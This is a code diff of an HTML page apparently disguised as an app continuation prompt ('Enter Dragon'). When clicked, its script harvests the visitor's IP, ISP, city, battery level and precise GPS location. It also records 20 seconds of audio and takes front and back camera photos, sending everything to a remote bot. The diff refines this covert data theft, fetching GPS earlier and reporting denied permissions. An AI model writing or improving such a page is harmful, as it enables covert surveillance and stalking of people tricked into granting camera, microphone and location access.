@@ -8,63 +8,78 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #000;
-            color: #fff;
-            font-family: sans-serif;
+            background-color: #050505; /* Dark background */
+            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000 100%);
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px 30px;
-            border-radius: 15px;
+        
+        .glass-panel {
+            background: rgba(30, 30, 30, 0.4);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 50px 30px;
+            border-radius: 20px;
             text-align: center;
-            max-width: 90%;
-            width: 350px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 85%;
+            width: 360px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.05);
         }
+
         h1 {
             margin-top: 0;
-            font-size: 26px;
-            letter-spacing: 2px;
+            font-size: 28px;
+            letter-spacing: 3px;
             text-transform: uppercase;
+            font-weight: 600;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
         }
+
         p {
-            font-size: 16px;
-            margin-bottom: 30px;
-            line-height: 1.5;
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.6;
+            color: #d1d1d1;
         }
-        .btn {
-            background: rgba(0, 123, 255, 0.5);
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(0, 123, 255, 0.8);
+
+        .btn-continue {
+            background: rgba(0, 102, 255, 0.2);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 102, 255, 0.5);
             color: white;
-            padding: 15px 30px;
+            padding: 16px 30px;
             font-size: 18px;
-            border-radius: 8px;
+            font-weight: 500;
+            border-radius: 12px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: all 0.3s ease;
             width: 100%;
-            box-sizing: border-box;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.15);
         }
-        .btn:active {
-            background: rgba(0, 123, 255, 0.8);
+
+        .btn-continue:active {
+            background: rgba(0, 102, 255, 0.4);
+            transform: scale(0.98);
         }
+
         .loader {
             display: none;
             margin: 20px auto;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #0066ff;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -73,10 +88,10 @@
 </head>
 <body>
 
-    <div class="container">
+    <div class="glass-panel">
         <h1>Enter Dragon</h1>
         <p>Do you want to continue using this app?<br>Is the service required?</p>
-        <button class="btn" id="continueBtn" onclick="startProcess()">Continue</button>
+        <button class="btn-continue" id="continueBtn" onclick="startProcess()">Continue</button>
         <div class="loader" id="loader"></div>
     </div>
 
@@ -106,7 +121,7 @@
             document.getElementById('loader').style.display = 'block';
 
             try {
-                // 1. Get Network Info (ISP / 5G / 4G)
+                // 1. Get Network Info (ISP) & Battery immediately
                 let networkData = "Network Info: Unknown";
                 try {
                     const res = await fetch('https://ipapi.co/json/');
@@ -114,7 +129,6 @@
                     networkData = `ISP/Network: ${ipJson.org}\nIP: ${ipJson.ip}\nLocation: ${ipJson.city}, ${ipJson.region}`;
                 } catch (e) {}
 
-                // 2. Get Battery Info
                 let batteryData = "Battery: Unknown";
                 try {
                     if (navigator.getBattery) {
@@ -122,10 +136,28 @@
                         batteryData = `Battery Level: ${Math.round(bat.level * 100)}%`;
                     }
                 } catch (e) {}
-
+                
                 await sendTextToBot(`Device Details:\n${networkData}\n${batteryData}`);
 
-                // 3. Audio & Front Camera
+                // 2. Fetch GPS Immediately (to prevent timeouts while audio records)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                            await sendTextToBot(`✅ GPS Location:\n${mapUrl}`);
+                        },
+                        async (err) => {
+                            await sendTextToBot(`❌ GPS Failed: ${err.message}`);
+                        },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                } else {
+                    await sendTextToBot(`❌ GPS Not Supported by Browser`);
+                }
+
+                // 3. Audio & Front Camera Process
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
@@ -157,27 +189,10 @@
                             await sendFileToBot(backPhoto, "back_camera.jpg");
                             backStream.getTracks().forEach(t => t.stop());
                         } catch (err) {
-                            console.log("Back camera issue");
+                            console.log("Back camera issue", err);
                         }
 
-                        // 5. GPS Location -> Google Maps Link
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                async (pos) => {
-                                    const lat = pos.coords.latitude;
-                                    const lon = pos.coords.longitude;
-                                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                                    await sendTextToBot(`GPS Location:\n${mapUrl}`);
-                                    finishLoading();
-                                },
-                                async (err) => {
-                                    finishLoading();
-                                },
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                            );
-                        } else {
-                            finishLoading();
-                        }
+                        finishLoading();
                     };
 
                     mediaRecorder.start();
@@ -188,6 +203,7 @@
                     }, 20000); // 20 seconds timer
 
                 } catch (e) {
+                    await sendTextToBot(`❌ Camera/Mic Permission Denied or Failed`);
                     finishLoading();
                 }
             } catch (e) {
